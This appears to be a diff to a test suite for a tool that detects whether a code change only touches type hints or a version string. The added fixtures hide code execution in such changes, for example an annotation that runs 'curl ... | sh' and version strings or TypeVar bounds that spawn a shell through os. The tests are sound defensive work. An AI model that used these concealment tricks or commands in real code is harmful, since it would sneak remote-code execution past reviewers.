@@ -1,8 +1,8 @@
 """A hostile change cannot pass for one that changes no behavior.
 
 The comparison sets aside what only a type checker reads, imports in step with the code using them,
-and reworded exception messages. Each of these regressions is code that does run, or a literal that
-is code, written to look like one of them.
+reworded exception messages, and a release's version string. Each of these regressions is code that
+does run, or a literal that is code, written to look like one of them.
 """
 
 from __future__ import annotations
@@ -157,3 +157,112 @@ def test_an_import_loaded_for_what_it_does_is_reported(repo_factory: Factory) ->
         for evidence in item["evidence"]
     }
     assert ("unknown_semantic_change", "<module>") in found
+
+
+TYPING_RULES = ("parameter_annotations", "typing_only", "version_only")
+
+
+def _passes_for_typing(deltas: list[StructuralDelta]) -> bool:
+    return any(item.metadata.get(key) for item in deltas for key in TYPING_RULES)
+
+
+@pytest.mark.parametrize(
+    ("old", "new", "name"),
+    [
+        pytest.param(
+            "import os\n\ndef save(path: int):\n    return path\n",
+            "import os\n\ndef save(path: os.system('curl https://example.invalid/x | sh') or int):\n"
+            "    return path\n",
+            "save",
+            id="annotation-that-runs-a-command",
+        ),
+        pytest.param(
+            "str = Payload()\n\ndef save(path: int):\n    return path\n",
+            "str = Payload()\n\ndef save(path: str):\n    return path\n",
+            "save",
+            id="rebound-builtin",
+        ),
+        pytest.param(
+            "import builtins\nsetattr(builtins, 'str', Payload())\n\ndef save(path: int):\n"
+            "    return path\n",
+            "import builtins\nsetattr(builtins, 'str', Payload())\n\ndef save(path: str):\n"
+            "    return path\n",
+            "save",
+            id="builtin-patched-by-name",
+        ),
+        pytest.param(
+            "from typing import Union\nfrom .payload import *\n\ndef save(path: int):\n"
+            "    return path\n",
+            "from typing import Union\nfrom .payload import *\n\ndef save(path: Union[int, str]):\n"
+            "    return path\n",
+            "save",
+            id="star-imported-over",
+        ),
+        pytest.param(
+            "@validate_call\ndef save(path: int):\n    return path\n",
+            "@validate_call\ndef save(path: Path):\n    return path\n",
+            "save",
+            id="decorator-reading-annotations",
+        ),
+        pytest.param(
+            "from typing import overload as validate\n\n@validate\ndef save(path: int):\n"
+            "    return path\n\nvalidate = check_types\n",
+            "from typing import overload as validate\n\n@validate\ndef save(path: str):\n"
+            "    return path\n\nvalidate = check_types\n",
+            "save",
+            id="inert-decorator-rebound",
+        ),
+    ],
+)
+def test_an_annotation_that_runs_or_is_read_never_passes_for_typing(
+    old: str, new: str, name: str
+) -> None:
+    assert not _passes_for_typing(_compare(old, new, name))
+
+
+@pytest.mark.parametrize(
+    ("old", "new", "name"),
+    [
+        pytest.param(
+            "from __future__ import annotations\n\nclass Order:\n    total: int = 0\n\n"
+            "Order = dataclass(Order)\n",
+            "from __future__ import annotations\n\nclass Order:\n    total: str = 0\n\n"
+            "Order = dataclass(Order)\n",
+            "Order",
+            id="class-made-a-dataclass-afterwards",
+        ),
+        pytest.param(
+            "from __future__ import annotations\n\nclass Order:\n    total = 0\n",
+            "from __future__ import annotations\n\nclass Order:\n    total = run_payload()\n",
+            "Order",
+            id="value-that-runs",
+        ),
+        pytest.param(
+            "from .vars import TypeVar\nLIMIT = 3\n",
+            "from .vars import TypeVar\nT = TypeVar('T')\nLIMIT = 3\n",
+            "<module>",
+            id="type-variable-factory-from-elsewhere",
+        ),
+        pytest.param(
+            "from typing import TypeVar\nLIMIT = 3\n\nTypeVar = run_payload\n",
+            "from typing import TypeVar\nT = TypeVar('T')\nLIMIT = 3\n\nTypeVar = run_payload\n",
+            "<module>",
+            id="type-variable-factory-rebound",
+        ),
+        pytest.param(
+            "from typing import TypeVar\nLIMIT = 3\n",
+            "from typing import TypeVar\nT = TypeVar('T', bound=__import__('os').system('sh'))\n"
+            "LIMIT = 3\n",
+            "<module>",
+            id="type-variable-argument-that-runs",
+        ),
+        pytest.param(
+            '__version__ = "1.0"\n',
+            "__version__ = __import__('os').popen('sh').read()\n",
+            "<module>",
+            id="version-that-runs",
+        ),
+    ],
+)
+def test_code_that_runs_never_passes_for_typing_or_a_version(old: str, new: str, name: str) -> None:
+    assert not _passes_for_typing(_compare(old, new, name))
